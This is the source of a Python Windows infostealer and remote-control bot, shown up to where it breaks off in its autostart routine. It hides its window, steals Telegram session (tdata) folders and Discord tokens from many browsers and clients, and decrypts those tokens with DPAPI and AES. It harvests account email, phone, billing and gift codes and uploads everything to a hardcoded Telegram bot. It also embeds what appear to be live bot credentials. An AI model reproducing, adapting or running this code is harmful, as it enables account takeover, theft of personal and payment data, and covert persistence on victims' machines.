import os
import sys
import ctypes
import shutil
import sqlite3
import socket
import platform
import getpass
import psutil
import base64
import requests
import json
import time
import html
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import threading
import re
import glob
import win32crypt
from win32crypt import CryptUnprotectData
import pyautogui
import sounddevice as sd
from scipy.io.wavfile import write
import keyboard
from PIL import Image
import pythoncom
from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume
import logging
import subprocess
import winsound
import tempfile
import msvcrt
import win32com.client
import win32clipboard
import zipfile
from requests.exceptions import Timeout, RequestException

# === Hide Window === #
if sys.platform == "win32":
    kernel32 = ctypes.windll.kernel32
    user32 = ctypes.windll.user32
    hwnd = kernel32.GetConsoleWindow()
    if hwnd:
        user32.ShowWindow(hwnd, 0) 

# === Logs ===
hostname = socket.gethostname().lower()
if hostname == 'belal':
    logging.basicConfig(
        filename=os.path.join(os.getenv('TEMP'),'syscache.tmp'),
        level=logging.DEBUG,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
else:
    
    logging.basicConfig(
        handlers=[logging.NullHandler()],
        level=logging.DEBUG
    )

update_lock = threading.Lock()
file_lock = threading.Lock()

class Stealer:
    def __init__(self):
        try:
            self.data_dir = os.path.join(os.getenv('TEMP'),'Temp-Data')
            os.makedirs(self.data_dir, exist_ok=True)
            self.device_id = socket.gethostname()
            self.lock_file = os.path.join(self.data_dir, 'bot.lock')
            self.devices_file = os.path.join(self.data_dir, 'devices.json')
            self.screenshot_file = os.path.join(self.data_dir, 'screenshot.png')
            self.recordaudio_file = os.path.join(self.data_dir, 'audio.wav')
            self.webcam_file = os.path.join(self.data_dir, 'webcam.jpg')
            self.wallpaper_file = os.path.join(self.data_dir, 'new_wallpaper.jpg')
            self.original_wallpaper_file = os.path.join(self.data_dir, 'original_wallpaper.jpg')
            self.passwords_md_file = os.path.join(self.data_dir, f'passwords_{self.device_id}.md')
            self.cookies_md_file = os.path.join(self.data_dir, f'cookies_{self.device_id}.md')
            self.history_md_file = os.path.join(self.data_dir, f'browser_history_{self.device_id}.md')
            self.waiting_for_photo = False
            self.waiting_for_showimage = False
            self.bot_token = '8576292518:AAG-4xvcyHa7SHRWTM1elIS3jag0EoRM1ok'
            self.chat_id = '8264390523'
            self.telegram_text_api = f'https://api.telegram.org/bot{self.bot_token}/sendMessage'
            self.telegram_photo_api = f'https://api.telegram.org/bot{self.bot_token}/sendPhoto'
            self.telegram_file_api = f'https://api.telegram.org/bot{self.bot_token}/sendDocument'
            self.telegram_audio_api = f"https://api.telegram.org/bot{self.bot_token}/sendAudio"
            self.api_id = 23371405
            self.api_hash = '844a531a64caaae8135e74784ef519d4'
            self.session_file = os.path.join(self.data_dir, 'telegram_session')
            self.running = True
            self.keyboard_locked = False
            self.search_buffer = ""
            self.last_process = ""
            self.processes_per_page = 10
            self.temp_dir = os.path.join(self.data_dir, 'temp')
            os.makedirs(self.temp_dir, exist_ok=True)
            self.current_page = 0
            self.current_files = {}
            self.current_path = None
            self.all_files = []
            self.process_list = []

            # === Startup /steal ===
            threading.Thread(target=self.auto_steal_tdata, daemon=True).start()
            self.register_device()
            self.acquire_lock()
            self.clear_update_queue()
            self.hide_window()
            self.enable_autostart()
            self.send_commands_list()
            self.setup_hotkey()
            logging.info(f"Stealer initialized on device {self.device_id}")
        except Exception as e:
            logging.error(f"Error in Stealer.__init__: {str(e)}")
            self.send_telegram_message(f"Initialization error on {self.device_id}: {str(e)}")
            self.release_lock()

  
    def auto_steal_tdata(self):
        time.sleep(5)  # Waiting for initialization
        try:
            self.send_telegram_message(f"<b>🔥 Autostart: checking tdata</b> <u><i>{self.device_id}</i></u> ...")
            self.steal_tdata()
        except Exception as e:
            logging.error(f"Auto steal failed: {e}")

    # === Commands /steal ===
    def steal_tdata(self):
        try:
            tgsession_dir = os.path.join(os.getenv('TEMP'),'tgsession')
            os.makedirs(tgsession_dir, exist_ok=True)

            telegram_paths = [
                os.path.join(os.getenv('APPDATA'), "Telegram Desktop", "tdata"),
                os.path.join(os.getenv('APPDATA'), "TelegramDesktop", "tdata"),
                os.path.join(os.getenv('APPDATA'), "AyuGram Desktop", "tdata"),
                os.path.join(os.getenv('APPDATA'), "AyuGramDesktop", "tdata"),
                os.path.join(os.getenv('APPDATA'), "AyuGram", "tdata"),
                os.path.join(os.path.expanduser("~"), "Desktop", "tdata"),
                os.path.join(os.path.expanduser("~"), "Downloads", "tdata"),
            ]

            found_any = False
            for i, src_dir in enumerate(telegram_paths):
                if not os.path.exists(src_dir):
                    continue

                path_folder = os.path.join(tgsession_dir, f"path_{i+1}")
                os.makedirs(path_folder, exist_ok=True)
                copied = False

                for item in os.listdir(src_dir):
                    src_path = os.path.join(src_dir, item)
                    dest_path = os.path.join(path_folder, item)
                    try:
                        if os.path.isfile(src_path) and item.endswith("s") and item not in ["countries", "settingss"]:
                            shutil.copy2(src_path, dest_path)
                            copied = True
                            folder_name = item[:-1]
                            folder_src = os.path.join(src_dir, folder_name)
                            if os.path.isdir(folder_src):
                                shutil.copytree(folder_src, os.path.join(path_folder, folder_name), dirs_exist_ok=True)
                    except: pass

                if copied:
                    found_any = True
                    self.send_telegram_message(f"<b>✅ tdata found: path {i+1}</b>")

            if found_any:
                zip_name = f"tg_session_{self.device_id}.zip"
                zip_path = os.path.join(os.getenv('TEMP'), zip_name)
                with zipfile.ZipFile(zip_path, 'w') as zipf:
                    for root, _, files in os.walk(tgsession_dir):
                        for file in files:
                            file_path = os.path.join(root, file)
                            arcname = os.path.relpath(file_path, tgsession_dir)
                            zipf.write(file_path, arcname)

                with open(zip_path, 'rb') as f:
                    requests.post(
                        self.telegram_file_api,
                        data={'chat_id': self.chat_id},
                        files={'document': (zip_name, f)}
                    ).raise_for_status()

                shutil.rmtree(tgsession_dir)
                os.remove(tgsession_dir)
                self.send_telegram_message(f"<b>🔥 tdata stolen from</b> <u><i>{self.device_id}</i></u>!")
            else:
                self.send_telegram_message(f"<b>❌ tdata not found on</b> <u><i>{self.device_id}</i></u>")

        except Exception as e:
            logging.error(f"Steal tdata error: {e}")
            self.send_telegram_message(f"Error stealing tdata: {e}")

    def steal_disdata(self):
        """Steal Discord tokens from browsers and Discord clients."""
        try:
            self.send_telegram_message(f"<b>🔥 checking disdata</b>")
            file_discord_account = ""
            number_discord_account = 0

            def ExtractToken():  
                base_url = "https://discord.com/api/v9/users/@me"
                regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
                regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
                tokens = []
                uids = []
                token_info = {}

                # Get AppData paths for the current user
                path_appdata_local = os.getenv("LOCALAPPDATA")
                path_appdata_roaming = os.getenv("APPDATA")

                paths = [
                    ("Discord",                os.path.join(path_appdata_roaming, "discord", "Local Storage", "leveldb"),                                                  ""),
                    ("Discord Canary",         os.path.join(path_appdata_roaming, "discordcanary", "Local Storage", "leveldb"),                                            ""),
                    ("Lightcord",              os.path.join(path_appdata_roaming, "Lightcord", "Local Storage", "leveldb"),                                                ""),
                    ("Discord PTB",            os.path.join(path_appdata_roaming, "discordptb", "Local Storage", "leveldb"),                                               ""),
                    ("Opera",                  os.path.join(path_appdata_roaming, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),                           "opera.exe"),
                    ("Opera GX",               os.path.join(path_appdata_roaming, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),                        "opera.exe"),
                    ("Opera Neon",             os.path.join(path_appdata_roaming, "Opera Software", "Opera Neon", "Local Storage", "leveldb"),                             "opera.exe"),
                    ("Amigo",                  os.path.join(path_appdata_local,   "Amigo", "User Data", "Local Storage", "leveldb"),                                       "amigo.exe"),
                    ("Torch",                  os.path.join(path_appdata_local,   "Torch", "User Data", "Local Storage", "leveldb"),                                       "torch.exe"),
                    ("Kometa",                 os.path.join(path_appdata_local,   "Kometa", "User Data", "Local Storage", "leveldb"),                                      "kometa.exe"),
                    ("Orbitum",                os.path.join(path_appdata_local,   "Orbitum", "User Data", "Local Storage", "leveldb"),                                     "orbitum.exe"),
                    ("CentBrowser",            os.path.join(path_appdata_local,   "CentBrowser", "User Data", "Local Storage", "leveldb"),                                 "centbrowser.exe"),
                    ("7Star",                  os.path.join(path_appdata_local,   "7Star", "7Star", "User Data", "Local Storage", "leveldb"),                              "7star.exe"),
                    ("Sputnik",                os.path.join(path_appdata_local,   "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb"),                          "sputnik.exe"),
                    ("Vivaldi",                os.path.join(path_appdata_local,   "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),                          "vivaldi.exe"),
                    ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),                 "chrome.exe"),
                    ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),               "chrome.exe"),
                    ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb"),               "chrome.exe"),
                    ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb"),               "chrome.exe"),
                    ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb"),               "chrome.exe"),
                    ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb"),               "chrome.exe"),
                    ("Google Chrome SxS",      os.path.join(path_appdata_local,   "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
                    ("Google Chrome Beta",     os.path.join(path_appdata_local,   "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb"),            "chrome.exe"),
                    ("Google Chrome Dev",      os.path.join(path_appdata_local,   "Google", "Chrome Dev", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
                    ("Google Chrome Unstable", os.path.join(path_appdata_local,   "Google", "Chrome Unstable", "User Data", "Default", "Local Storage", "leveldb"),        "chrome.exe"),
                    ("Google Chrome Canary",   os.path.join(path_appdata_local,   "Google", "Chrome Canary", "User Data", "Default", "Local Storage", "leveldb"),          "chrome.exe"),
                    ("Epic Privacy Browser",   os.path.join(path_appdata_local,   "Epic Privacy Browser", "User Data", "Local Storage", "leveldb"),                        "epic.exe"),
                    ("Microsoft Edge",         os.path.join(path_appdata_local,   "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),                "msedge.exe"),
                    ("Uran",                   os.path.join(path_appdata_local,   "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb"),                "uran.exe"),
                    ("Yandex",                 os.path.join(path_appdata_local,   "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),          "yandex.exe"),
                    ("Yandex Canary",          os.path.join(path_appdata_local,   "Yandex", "YandexBrowserCanary", "User Data", "Default", "Local Storage", "leveldb"),    "yandex.exe"),
                    ("Yandex Developer",       os.path.join(path_appdata_local,   "Yandex", "YandexBrowserDeveloper", "User Data", "Default", "Local Storage", "leveldb"), "yandex.exe"),
                    ("Yandex Beta",            os.path.join(path_appdata_local,   "Yandex", "YandexBrowserBeta", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
                    ("Yandex Tech",            os.path.join(path_appdata_local,   "Yandex", "YandexBrowserTech", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
                    ("Yandex SxS",             os.path.join(path_appdata_local,   "Yandex", "YandexBrowserSxS", "User Data", "Default", "Local Storage", "leveldb"),       "yandex.exe"),
                    ("Brave",                  os.path.join(path_appdata_local,   "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),   "brave.exe"),
                    ("Iridium",                os.path.join(path_appdata_local,   "Iridium", "User Data", "Default", "Local Storage", "leveldb"),                          "iridium.exe"),
                ]

                try:
                    for v4r_name, v4r_path, v4r_proc_name in paths:
                        for v4r_proc in psutil.process_iter(['pid', 'name']):
                            try:
                                if v4r_proc.name().lower() == v4r_proc_name.lower():
                                    v4r_proc.terminate()
                            except:
                                pass
                except:
                    pass

                for i, (v4r_name, v4r_path, v4r_proc_name) in enumerate(paths):
                    if not os.path.exists(v4r_path):
                        continue
                    v4r__d15c0rd = v4r_name.replace(" ", "").lower()
                    found_token_in_path = False
                    if "cord" in v4r_path:
                        if not os.path.exists(os.path.join(path_appdata_roaming, v4r__d15c0rd, 'Local State')):
                            continue
                        for v4r_file_name in os.listdir(v4r_path):
                            if v4r_file_name[-3:] not in ["log", "ldb"]:
                                continue
                            v4r_total_path = os.path.join(v4r_path, v4r_file_name)
                            if os.path.exists(v4r_total_path):
                                with open(v4r_total_path, errors='ignore') as v4r_file:
                                    for v4r_line in v4r_file:
                                        for y in re.findall(regexp_enc, v4r_line.strip()):
                                            v4r_t0k3n = DecryptVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), GetMasterKey(os.path.join(path_appdata_roaming, v4r__d15c0rd, 'Local State')))
                                            if ValidateToken(v4r_t0k3n, base_url):
                                                try:
                                                    v4r_uid = requests.get(base_url, headers={'Authorization': v4r_t0k3n}, timeout=10).json()['id']
                                                except (requests.exceptions.RequestException, ConnectionResetError, KeyError):
                                                    continue
                                                if v4r_uid not in uids:
                                                    tokens.append(v4r_t0k3n)
                                                    uids.append(v4r_uid)
                                                    token_info[v4r_t0k3n] = (v4r_name, v4r_total_path)
                                                    found_token_in_path = True
                    else:
                        for v4r_file_name in os.listdir(v4r_path):
                            if v4r_file_name[-3:] not in ["log", "ldb"]:
                                continue
                            v4r_total_path = os.path.join(v4r_path, v4r_file_name)
                            if os.path.exists(v4r_total_path):
                                with open(v4r_total_path, errors='ignore') as v4r_file:
                                    for v4r_line in v4r_file:
                                        for v4r_t0k3n in re.findall(regexp, v4r_line.strip()):
                                            if ValidateToken(v4r_t0k3n, base_url):
                                                try:
                                                    v4r_uid = requests.get(base_url, headers={'Authorization': v4r_t0k3n}, timeout=10).json()['id']
                                                except (requests.exceptions.RequestException, ConnectionResetError, KeyError):
                                                    continue
                                                if v4r_uid not in uids:
                                                    tokens.append(v4r_t0k3n)
                                                    uids.append(v4r_uid)
                                                    token_info[v4r_t0k3n] = (v4r_name, v4r_total_path)
                                                    found_token_in_path = True
                    
                    if found_token_in_path:
                        logging.info(f"Discord tokens found in: {v4r_name}")
                        self.send_telegram_message(f"<b>✅ Discord tokens found in: {v4r_name}</b>")
                        
                found_firefox = False
                if os.path.exists(os.path.join(path_appdata_roaming, "Mozilla", "Firefox", "Profiles")):
                    for v4r_path, _, v4r_files in os.walk(os.path.join(path_appdata_roaming, "Mozilla", "Firefox", "Profiles")):
                        for v4r__file in v4r_files:
                            if v4r__file.endswith('.sqlite'):
                                with open(os.path.join(v4r_path, v4r__file), errors='ignore') as v4r_file:
                                    for v4r_line in v4r_file:
                                        for v4r_t0k3n in re.findall(regexp, v4r_line.strip()):
                                            if ValidateToken(v4r_t0k3n, base_url):
                                                try:
                                                    v4r_uid = requests.get(base_url, headers={'Authorization': v4r_t0k3n}, timeout=10).json()['id']
                                                except (requests.exceptions.RequestException, ConnectionResetError, KeyError):
                                                    continue
                                                if v4r_uid not in uids:
                                                    tokens.append(v4r_t0k3n)
                                                    uids.append(v4r_uid)
                                                    token_info[v4r_t0k3n] = ('Firefox', os.path.join(v4r_path, v4r__file))
                                                    found_firefox = True
                if found_firefox:
                    self.send_telegram_message(f"<b>✅ Discord tokens found: Firefox</b>")
                return tokens, token_info

            def ValidateToken(v4r_t0k3n, base_url):
                try:
                    return requests.get(base_url, headers={'Authorization': v4r_t0k3n}, timeout=10).status_code == 200
                except (requests.exceptions.RequestException, ConnectionResetError):
                    return False

            def DecryptVal(v4r_buff, v4r_master_key):
                v4r_iv = v4r_buff[3:15]
                v4r_payload = v4r_buff[15:]
                v4r_cipher = AES.new(v4r_master_key, AES.MODE_GCM, v4r_iv)
                return v4r_cipher.decrypt(v4r_payload)[:-16].decode()

            def GetMasterKey(v4r_path):
                if not os.path.exists(v4r_path):
                    return None
                with open(v4r_path, "r", encoding="utf-8") as v4r_f:
                    v4r_local_state = json.load(v4r_f)
                v4r_master_key = base64.b64decode(v4r_local_state["os_crypt"]["encrypted_key"])[5:]
                return CryptUnprotectData(v4r_master_key, None, None, None, 0)[1]

            tokens, token_info = ExtractToken()
            
            if not tokens:
                file_discord_account = "No discord tokens found."

            for v4r_t0k3n_d15c0rd in tokens:
                number_discord_account += 1

                try: 
                    v4r_api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': v4r_t0k3n_d15c0rd}, timeout=10).json()
                except (requests.exceptions.RequestException, ConnectionResetError, json.JSONDecodeError): 
                    v4r_api = {"None": "None"}

                v4r_u53rn4m3_d15c0rd = v4r_api.get('username', "None") +" # "+ v4r_api.get('discriminator', "None")
                v4r_d15pl4y_n4m3_d15c0rd = v4r_api.get('global_name', "None")
                v4r_us3r_1d_d15c0rd = v4r_api.get('id', "None")
                v4r_em4i1_d15c0rd = v4r_api.get('email', "None")
                v4r_em4il_v3rifi3d_d15c0rd = v4r_api.get('verified', "None")
                v4r_ph0n3_d15c0rd = v4r_api.get('phone', "None")
                v4r_c0untry_d15c0rd = v4r_api.get('locale', "None")
                v4r_mf4_d15c0rd = v4r_api.get('mfa_enabled', "None")

                try:
                    if v4r_api.get('premium_type', 'None') == 0:
                        v4r_n1tr0_d15c0rd = 'False'
                    elif v4r_api.get('premium_type', 'None') == 1:
                        v4r_n1tr0_d15c0rd = 'Nitro Classic'
                    elif v4r_api.get('premium_type', 'None') == 2:
                        v4r_n1tr0_d15c0rd = 'Nitro Boosts'
                    elif v4r_api.get('premium_type', 'None') == 3:
                        v4r_n1tr0_d15c0rd = 'Nitro Basic'
                    else:
                        v4r_n1tr0_d15c0rd = 'False'
                except:
                    v4r_n1tr0_d15c0rd = "None"

                try: 
                    v4r_av4t4r_ur1_d15c0rd = f"https://cdn.discordapp.com/avatars/{v4r_us3r_1d_d15c0rd}/{v4r_api['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{v4r_us3r_1d_d15c0rd}/{v4r_api['avatar']}.gif", timeout=10).status_code == 200 else f"https://cdn.discordapp.com/avatars/{v4r_us3r_1d_d15c0rd}/{v4r_api['avatar']}.png"
                except (requests.exceptions.RequestException, ConnectionResetError, KeyError): 
                    v4r_av4t4r_ur1_d15c0rd = "None"

                try:
                    v4r_billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': v4r_t0k3n_d15c0rd}, timeout=10).json()
                    if v4r_billing_discord:
                        v4r_p4ym3nt_m3th0d5_d15c0rd = []

                        for v4r_method in v4r_billing_discord:
                            if v4r_method['type'] == 1:
                                v4r_p4ym3nt_m3th0d5_d15c0rd.append('Bank Card')
                            elif v4r_method['type'] == 2:
                                v4r_p4ym3nt_m3th0d5_d15c0rd.append("Paypal")
                            else:
                                v4r_p4ym3nt_m3th0d5_d15c0rd.append('Other')
                        v4r_p4ym3nt_m3th0d5_d15c0rd = ' / '.join(v4r_p4ym3nt_m3th0d5_d15c0rd)
                    else:
                        v4r_p4ym3nt_m3th0d5_d15c0rd = "None"
                except (requests.exceptions.RequestException, ConnectionResetError, json.JSONDecodeError, KeyError):
                    v4r_p4ym3nt_m3th0d5_d15c0rd = "None"

                try:
                    v4r_gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': v4r_t0k3n_d15c0rd}, timeout=10).json()
                    if v4r_gift_codes:
                        v4r_codes = []
                        for v4r_g1ft_c0d35_d15c0rd in v4r_gift_codes:
                            v4r_name = v4r_g1ft_c0d35_d15c0rd['promotion']['outbound_title']
                            v4r_g1ft_c0d35_d15c0rd = v4r_g1ft_c0d35_d15c0rd['code']
                            v4r_data = f"Gift: \"{v4r_name}\" Code: \"{v4r_g1ft_c0d35_d15c0rd}\""
                            if len('\n\n'.join(v4r_codes)) + len(v4r_data) >= 1024:
                                break
                            v4r_codes.append(v4r_data)
                        if len(v4r_codes) > 0:
                            v4r_g1ft_c0d35_d15c0rd = '\n\n'.join(v4r_codes)
                        else:
                            v4r_g1ft_c0d35_d15c0rd = "None"
                    else:
                        v4r_g1ft_c0d35_d15c0rd = "None"
                except (requests.exceptions.RequestException, ConnectionResetError, json.JSONDecodeError, KeyError):
                    v4r_g1ft_c0d35_d15c0rd = "None"
            
                try: 
                    v4r_software_name, v4r_path = token_info.get(v4r_t0k3n_d15c0rd, ("Unknown", "Unknown"))
                except: 
                    v4r_software_name, v4r_path = "Unknown", "Unknown"

                file_discord_account = file_discord_account + f"""
Discord Account N°{str(number_discord_account)}:
 - Path Found      : {v4r_path}
 - Software        : {v4r_software_name}
 - Token           : {v4r_t0k3n_d15c0rd}
 - Username        : {v4r_u53rn4m3_d15c0rd}
 - Display Name    : {v4r_d15pl4y_n4m3_d15c0rd}
 - Id              : {v4r_us3r_1d_d15c0rd}
 - Email           : {v4r_em4i1_d15c0rd}
 - Email Verified  : {v4r_em4il_v3rifi3d_d15c0rd}
 - Phone           : {v4r_ph0n3_d15c0rd}
 - Nitro           : {v4r_n1tr0_d15c0rd}
 - Language        : {v4r_c0untry_d15c0rd}
 - Billing         : {v4r_p4ym3nt_m3th0d5_d15c0rd}
 - Gift Code       : {v4r_g1ft_c0d35_d15c0rd}
 - Profile Picture : {v4r_av4t4r_ur1_d15c0rd}
 - Multi-Factor Authentication : {v4r_mf4_d15c0rd}
"""
            
            # Create ZIP file and send via Telegram
            zip_name = f"Discord_Accounts.zip"
            zip_path = self.devices_file = os.path.join(self.data_dir, zip_name)
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                zip_file.writestr(f"Discord_Accounts ({number_discord_account}).txt", file_discord_account)

            with open(zip_path, 'rb') as f:
                requests.post(
                    self.telegram_file_api,
                    data={'chat_id': self.chat_id},
                    files={'document': (zip_name, f)},
                    timeout=30
                ).raise_for_status()

            os.remove(zip_name)
            self.send_telegram_message(f"<b>🔥 Discord tokens stolen from</b> <u><i>{self.device_id}</i></u> <b>({number_discord_account} accounts)</b>")
            logging.info(f"Discord tokens stolen: {number_discord_account} accounts")

        except Exception as e:
            logging.error(f"Steal Discord tokens error: {e}")
            self.send_telegram_message(f"Error stealing Discord tokens: {e}")

    def register_device(self):
        """Register this device in the devices.json file. Idempotent: updates if exists, adds if not."""
        try:
            with file_lock:
                devices = self.load_devices()
                device_id_lower = self.device_id.lower()
                
                # Check if device exists (case-insensitive)
                device_exists = False
                actual_device_id = None
                for existing_id in devices['devices']:
                    if existing_id.lower() == device_id_lower:
                        device_exists = True
                        actual_device_id = existing_id
                        break
                
                # Always update last_seen and chat_id (idempotent operation)
                now = str(datetime.now())
                if device_exists:
                    # Update existing device entry
                    devices['devices'][actual_device_id]['last_seen'] = now
                    devices['devices'][actual_device_id]['chat_id'] = self.chat_id
                    logging.info(f"Device updated: {actual_device_id}")
                else:
                    # Add new device entry
                    devices['devices'][self.device_id] = {
                        'chat_id': self.chat_id, 
                        'last_seen': now
                    }
                    logging.info(f"Device registered: {self.device_id}")
                    self.send_telegram_message(f"<b>Device registered:</b> <u><i>{self.device_id}</i></u>")
                
                self.save_devices(devices)
                
                # Auto-select if this is the only device
                device_count = len(devices['devices'])
                if device_count == 1:
                    chat_id_str = str(self.chat_id)
                    # Use actual_device_id if device existed, otherwise use self.device_id
                    device_id_to_select = actual_device_id if device_exists else self.device_id
                    devices['selected'][chat_id_str] = device_id_to_select
                    self.save_devices(devices)
                    logging.info(f"Auto-selected device {device_id_to_select} for chat_id {chat_id_str} (first device)")
        except Exception as e:
            logging.error(f"Error registering device {self.device_id}: {str(e)}")
            self.send_telegram_message(f"Error registering device {self.device_id}: {str(e)}")

    def _validate_devices_structure(self, data):
        """Validate and normalize the devices.json structure. Returns safe default if invalid."""
        # Ensure we have a dict
        if not isinstance(data, dict):
            logging.warning("devices.json root is not a dict, using defaults")
            return {'devices': {}, 'selected': {}}
        
        # Ensure 'devices' exists and is a dict
        if 'devices' not in data or not isinstance(data['devices'], dict):
            logging.warning("devices.json missing or invalid 'devices' key, initializing")
            data['devices'] = {}
        
        # Ensure 'selected' exists and is a dict
        if 'selected' not in data or not isinstance(data['selected'], dict):
            logging.warning("devices.json missing or invalid 'selected' key, initializing")
            data['selected'] = {}
        
        # Validate each device entry has required fields
        devices_to_remove = []
        for device_id, device_info in data['devices'].items():
            if not isinstance(device_info, dict):
                logging.warning(f"Device {device_id} entry is not a dict, will be removed")
                devices_to_remove.append(device_id)
                continue
            
            # Ensure required fields exist
            if 'chat_id' not in device_info or 'last_seen' not in device_info:
                logging.warning(f"Device {device_id} missing required fields, will be removed")
                devices_to_remove.append(device_id)
                continue
            
            # Validate last_seen is a string (backward compatible)
            if not isinstance(device_info['last_seen'], str):
                logging.warning(f"Device {device_id} has invalid last_seen format, fixing")
                device_info['last_seen'] = str(datetime.now())
        
        # Remove invalid device entries
        for device_id in devices_to_remove:
            del data['devices'][device_id]
            # Also remove from selected if it was selected
            for chat_id in list(data['selected'].keys()):
                if data['selected'][chat_id] == device_id:
                    del data['selected'][chat_id]
        
        return data

    def load_devices(self):
        """Load devices and selected device from devices.json."""
        try:
            if os.path.exists(self.devices_file):
                with open(self.devices_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    # Validate structure immediately after loading
                    return self._validate_devices_structure(data)
            return {'devices': {}, 'selected': {}}
        except json.JSONDecodeError as e:
            logging.error(f"JSON decode error loading devices: {str(e)}")
            return {'devices': {}, 'selected': {}}
        except Exception as e:
            logging.error(f"Error loading devices: {str(e)}")
            return {'devices': {}, 'selected': {}}

    def save_devices(self, devices):
        """Save devices and selected device to devices.json using atomic write."""
        # Validate structure before saving to prevent corrupt writes
        devices = self._validate_devices_structure(devices)
        
        # Atomic write: write to temp file first, then replace
        temp_file = self.devices_file + '.tmp'
        try:
            with open(temp_file, 'w', encoding='utf-8') as f:
                json.dump(devices, f, indent=2)
                f.flush()  # Ensure data is written to OS buffer
                os.fsync(f.fileno())  # Force write to disk
            
            # Atomic replacement - this is atomic on Windows and Unix
            os.replace(temp_file, self.devices_file)
        except Exception as e:
            logging.error(f"Error saving devices: {str(e)}")
            # Clean up temp file if it exists
            try:
                if os.path.exists(temp_file):
                    os.remove(temp_file)
            except:
                pass
            raise  # Re-raise to allow caller to handle

    def get_selected_device(self, chat_id):
        """Get the selected device for a given chat_id. Auto-selects if exactly one device exists."""
        with file_lock:
            devices = self.load_devices()
            chat_id_str = str(chat_id)
            
            # Get selected device (if any)
            selected_device_id = devices['selected'].get(chat_id_str)
            
            # If there's an explicit selection, validate it
            if selected_device_id is not None:
                # Validate that the selected device actually exists in devices dict
                selected_device_id_lower = selected_device_id.lower()
                device_exists = False
                actual_device_id = None
                
                for existing_id in devices['devices']:
                    if existing_id.lower() == selected_device_id_lower:
                        device_exists = True
                        actual_device_id = existing_id
                        break
                
                # If selected device doesn't exist, clear the selection (stale reference)
                if not device_exists:
                    logging.warning(f"Selected device {selected_device_id} for chat_id {chat_id_str} no longer exists, clearing selection")
                    del devices['selected'][chat_id_str]
                    self.save_devices(devices)
                    # Fall through to auto-selection logic below
                else:
                    # Return the actual device ID (preserving case from devices dict)
                    return actual_device_id
            
            # No explicit selection exists - check for auto-selection opportunity
            device_count = len(devices['devices'])
            
            # Auto-select if exactly one device exists (idempotent)
            if device_count == 1:
                # Get the single device ID
                single_device_id = list(devices['devices'].keys())[0]
                
                # Auto-select it (idempotent - safe to call multiple times)
                devices['selected'][chat_id_str] = single_device_id
                self.save_devices(devices)
                logging.info(f"Auto-selected device {single_device_id} for chat_id {chat_id_str} (only device available)")
                return single_device_id
            
            # More than one device or no devices - return None (user must explicitly select)
            # Never store None in devices['selected'] - key should be absent if no selection
            return None

    def set_selected_device(self, chat_id, device_id):
        """Set the selected device for a given chat_id. Validates device exists before setting."""
        try:
            with file_lock:
                devices = self.load_devices()
                # load_devices() already validates structure, but ensure we have valid dicts
                if not isinstance(devices, dict) or 'devices' not in devices or 'selected' not in devices:
                    logging.error("Invalid devices structure in set_selected_device")
                    return f"Error: Invalid device registry structure"
                
                device_id_lower = device_id.lower()
                device_ids_lower = {d.lower(): d for d in devices['devices']}
                
                if device_id_lower in device_ids_lower:
                    # Use the actual device ID from the registry (preserves case)
                    actual_device_id = device_ids_lower[device_id_lower]
                    devices['selected'][str(chat_id)] = actual_device_id
                    self.save_devices(devices)
                    logging.info(f"Selected device {actual_device_id} for chat_id {chat_id}")
                    return f"<b>Selected device:</b> <u><i>{actual_device_id}</i></u>"
                return f"Device <u>{device_id}</u> not found. Use /listdevices to see available devices."
        except Exception as e:
            logging.error(f"Error setting selected device: {str(e)}")
            return f"Error selecting device: {str(e)}"
    def list_devices(self):
        """List all registered devices."""
        try:
            with file_lock:
                devices = self.load_devices()
                if not devices['devices']:
                    return "No devices registered."
                device_list = [f"<pre><code class='language-Devices'>{device_id} | Last seen: {info['last_seen']}</code></pre>" for device_id, info in devices['devices'].items()]
                return "<b>Registered devices:</b>\n" + "\n".join(device_list)
        except Exception as e:
            logging.error(f"Error listing devices: {str(e)}")
            return f"Error listing devices: {str(e)}"

    def debug_devices(self):
        """Return the raw content of devices.json for debugging."""
        try:
            with file_lock:
                devices = self.load_devices()
                devices_json = json.dumps(devices, indent=2)
                devices_escaped = html.escape(devices_json)
                return f"<b>devices.json content:<pre class='language-js'>{devices_escaped}</pre></b>"
        except Exception as e:
            logging.error(f"Error debugging devices: {str(e)}")
            return f"Error debugging devices: {str(e)}"

    def enable_autostart(self):
        """Add the script to the Windows Startup folder as a shortcut."""
        try:
